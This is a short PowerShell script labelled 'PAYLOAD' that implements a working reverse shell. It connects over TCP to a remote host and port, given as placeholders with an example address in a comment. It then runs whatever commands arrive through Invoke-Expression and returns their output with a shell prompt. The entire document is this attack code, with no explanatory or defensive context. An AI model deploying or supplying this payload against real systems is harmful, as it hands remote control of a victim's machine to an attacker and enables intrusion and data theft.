# PAYLOAD
# E.g.: ...TCPClient('192.168.0.15', 4444);
$client = New-Object System.Net.Sockets.TCPClient('<REMOTE HOST>', '<REMOTE PORT>');
$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $sendbyte = ([text.encoding]::ASCII).GetBytes((iex ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)) 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> ');
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};

$client.Close();